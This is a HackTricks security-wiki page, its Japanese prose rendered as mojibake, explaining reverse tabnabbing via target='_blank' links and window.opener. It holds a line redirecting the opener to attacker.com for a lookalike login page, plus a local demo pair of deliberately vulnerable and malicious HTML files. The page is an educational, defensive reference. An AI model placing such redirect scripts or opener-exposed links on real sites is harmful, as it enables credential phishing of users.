{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


# èª¬æ˜

**æ”»æ’ƒè€…**ãŒ**`<a`**ã‚¿ã‚°ã®**`href`**å¼•æ•°ã‚’åˆ¶å¾¡ã§ãã‚‹çŠ¶æ³ã§ã€å±æ€§**`target="_blank" rel="opener"`**ãŒè¨­å®šã•ã‚Œã¦ã„ã‚‹å ´åˆã€**æ”»æ’ƒè€…**ã¯ã“ã®**ãƒªãƒ³ã‚¯**ã‚’è‡ªåˆ†ã®åˆ¶å¾¡ä¸‹ã«ã‚ã‚‹ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆï¼ˆ**æ‚ªæ„ã®ã‚ã‚‹** **ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆ**ï¼‰ã«å‘ã‘ã¾ã™ã€‚æ¬¡ã«ã€**è¢«å®³è€…ãŒãƒªãƒ³ã‚¯ã‚’ã‚¯ãƒªãƒƒã‚¯**ã—ã¦æ”»æ’ƒè€…ã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã¨ã€ã“ã®**æ‚ªæ„ã®ã‚ã‚‹** **ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆ**ã¯**`window.opener`**ã¨ã„ã†javascriptã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ä»‹ã—ã¦**å…ƒã®** **ãƒšãƒ¼ã‚¸**ã‚’**åˆ¶å¾¡**ã§ãã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚\
ãƒšãƒ¼ã‚¸ã«**`rel="opener"`**ãŒãªã„ãŒ**`target="_blank"`**ãŒå«ã¾ã‚Œã¦ã„ã‚‹å ´åˆã€**`rel="noopener"`**ãŒãªã„å ´åˆã‚‚è„†å¼±ã§ã‚ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

ã“ã®å‹•ä½œã‚’æ‚ªç”¨ã™ã‚‹ä¸€èˆ¬çš„ãªæ–¹æ³•ã¯ã€**å…ƒã®ã‚¦ã‚§ãƒ–ã®ä½ç½®ã‚’å¤‰æ›´**ã™ã‚‹ã“ã¨ã§ã™ã€‚`window.opener.location = https://attacker.com/victim.html`ã‚’ä½¿ç”¨ã—ã¦ã€æ”»æ’ƒè€…ãŒåˆ¶å¾¡ã™ã‚‹**å…ƒã®ã‚‚ã®ã«ä¼¼ãŸ**ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã«å¤‰æ›´ã—ã€å…ƒã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã®**ãƒ­ã‚°ã‚¤ãƒ³** **ãƒ•ã‚©ãƒ¼ãƒ **ã‚’æ¨¡å€£ã—ã¦ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«è³‡æ ¼æƒ…å ±ã‚’è¦æ±‚ã™ã‚‹ã“ã¨ã§ã™ã€‚

ãŸã ã—ã€**æ”»æ’ƒè€…ãŒå…ƒã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã®ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’åˆ¶å¾¡ã§ãã‚‹ãŸã‚**ã€ä»–ã®æ–¹æ³•ã§ãã‚Œã‚’æ‚ªç”¨ã—ã¦**ã‚ˆã‚Šå·§å¦™ãªæ”»æ’ƒ**ã‚’è¡Œã†ã“ã¨ãŒã§ãã‚‹ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ï¼ˆãŠãã‚‰ãjavascriptã‚¤ãƒ™ãƒ³ãƒˆã‚’å¤‰æ›´ã—ã¦ã€å½¼ãŒåˆ¶å¾¡ã™ã‚‹ã‚µãƒ¼ãƒãƒ¼ã«æƒ…å ±ã‚’æµå‡ºã•ã›ã‚‹ï¼Ÿï¼‰

# æ¦‚è¦

## ãƒãƒƒã‚¯ãƒªãƒ³ã‚¯ã‚ã‚Š

é˜²æ­¢å±æ€§ãŒä½¿ç”¨ã•ã‚Œã¦ã„ãªã„å ´åˆã®è¦ªãƒšãƒ¼ã‚¸ã¨å­ãƒšãƒ¼ã‚¸é–“ã®ãƒªãƒ³ã‚¯ï¼š

![https://owasp.org/www-community/assets/images/TABNABBING_OVERVIEW_WITH_LINK.png](https://owasp.org/www-community/assets/images/TABNABBING\_OVERVIEW\_WITH\_LINK.png)

## ãƒãƒƒã‚¯ãƒªãƒ³ã‚¯ãªã—

é˜²æ­¢å±æ€§ãŒä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹å ´åˆã®è¦ªãƒšãƒ¼ã‚¸ã¨å­ãƒšãƒ¼ã‚¸é–“ã®ãƒªãƒ³ã‚¯ï¼š

![https://owasp.org/www-community/assets/images/TABNABBING_OVERVIEW_WITHOUT_LINK.png](https://owasp.org/www-community/assets/images/TABNABBING\_OVERVIEW\_WITHOUT\_LINK.png)

## ä¾‹ <a href="#examples" id="examples"></a>

ãƒ•ã‚©ãƒ«ãƒ€ãƒ¼ã«æ¬¡ã®ãƒšãƒ¼ã‚¸ã‚’ä½œæˆã—ã€`python3 -m http.server`ã§ã‚¦ã‚§ãƒ–ã‚µãƒ¼ãƒãƒ¼ã‚’å®Ÿè¡Œã—ã¾ã™ã€‚\
æ¬¡ã«ã€**ã‚¢ã‚¯ã‚»ã‚¹** `http://127.0.0.1:8000/`vulnerable.htmlã€**ã‚¯ãƒªãƒƒã‚¯**ã—ã¦ãƒªãƒ³ã‚¯ã‚’ã‚¯ãƒªãƒƒã‚¯ã—ã€**å…ƒã®** **ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆ**ã®**URL**ãŒ**å¤‰æ›´**ã•ã‚Œã‚‹æ§˜å­ã‚’ç¢ºèªã—ã¾ã™ã€‚

{% code title="vulnerable.html" %}
```markup
<!DOCTYPE html>
<html>
<body>
<h1>Victim Site</h1>
<a href="http://127.0.0.1:8000/malicious.html" target="_blank" rel="opener">Controlled by the attacker</a>
</body>
</html>
```
{% endcode %}

{% code title="malicious.html" %}
```markup
<!DOCTYPE html>
<html>
<body>
<script>
window.opener.location = "http://127.0.0.1:8000/malicious_redir.html";
</script>
</body>
</html>
```
{% endcode %}

{% code title="malicious_redir.html" %}
```markup
<!DOCTYPE html>
<html>
<body>
<h1>New Malicious Site</h1>
</body>
</html>
```
{% endcode %}

## ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½ãªãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ <a href="#accessible-properties" id="accessible-properties"></a>

**ã‚¯ãƒ­ã‚¹ã‚ªãƒªã‚¸ãƒ³** ã‚¢ã‚¯ã‚»ã‚¹ãŒç™ºç”Ÿã™ã‚‹ã‚·ãƒŠãƒªã‚ªã§ã¯ï¼ˆç•°ãªã‚‹ãƒ‰ãƒ¡ã‚¤ãƒ³é–“ã®ã‚¢ã‚¯ã‚»ã‚¹ï¼‰ã€æ‚ªæ„ã®ã‚ã‚‹ã‚µã‚¤ãƒˆãŒã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ **opener** JavaScript ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆå‚ç…§ã«ã‚ˆã£ã¦å‚ç…§ã•ã‚Œã‚‹ **window** JavaScript ã‚¯ãƒ©ã‚¹ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã®ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã¯ä»¥ä¸‹ã®ã‚ˆã†ã«åˆ¶é™ã•ã‚Œã¾ã™ï¼š

- **`opener.closed`**: ã“ã®ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã¯ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ãŒé–‰ã˜ã‚‰ã‚ŒãŸã‹ã©ã†ã‹ã‚’åˆ¤æ–­ã™ã‚‹ãŸã‚ã«ã‚¢ã‚¯ã‚»ã‚¹ã•ã‚Œã€ãƒ–ãƒ¼ãƒ«å€¤ã‚’è¿”ã—ã¾ã™ã€‚
- **`opener.frames`**: ã“ã®ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã¯ç¾åœ¨ã®ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦å†…ã®ã™ã¹ã¦ã® iframe è¦ç´ ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã‚’æä¾›ã—ã¾ã™ã€‚
- **`opener.length`**: ç¾åœ¨ã®ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ã«å­˜åœ¨ã™ã‚‹ iframe è¦ç´ ã®æ•°ãŒã“ã®ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã«ã‚ˆã£ã¦è¿”ã•ã‚Œã¾ã™ã€‚
- **`opener.opener`**: ç¾åœ¨ã®ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ã‚’é–‹ã„ãŸã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ã¸ã®å‚ç…§ã¯ã“ã®ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã‚’é€šã˜ã¦å–å¾—ã§ãã¾ã™ã€‚
- **`opener.parent`**: ã“ã®ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã¯ç¾åœ¨ã®ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ã®è¦ªã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ã‚’è¿”ã—ã¾ã™ã€‚
- **`opener.self`**: ç¾åœ¨ã®ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦è‡ªä½“ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã¯ã“ã®ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã«ã‚ˆã£ã¦æä¾›ã•ã‚Œã¾ã™ã€‚
- **`opener.top`**: ã“ã®ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã¯æœ€ä¸Šä½ã®ãƒ–ãƒ©ã‚¦ã‚¶ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ã‚’è¿”ã—ã¾ã™ã€‚

ãŸã ã—ã€ãƒ‰ãƒ¡ã‚¤ãƒ³ãŒåŒä¸€ã®å ´åˆã€æ‚ªæ„ã®ã‚ã‚‹ã‚µã‚¤ãƒˆã¯ [**window**](https://developer.mozilla.org/en-US/docs/Web/API/Window) JavaScript ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆå‚ç…§ã«ã‚ˆã£ã¦å…¬é–‹ã•ã‚Œã¦ã„ã‚‹ã™ã¹ã¦ã®ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã™ã€‚

# äºˆé˜²

äºˆé˜²æƒ…å ±ã¯ [HTML5 Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTML5\_Security\_Cheat\_Sheet.html#tabnabbing) ã«æ–‡æ›¸åŒ–ã•ã‚Œã¦ã„ã¾ã™ã€‚

## å‚è€ƒæ–‡çŒ®

* [https://owasp.org/www-community/attacks/Reverse_Tabnabbing](https://owasp.org/www-community/attacks/Reverse_Tabnabbing)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
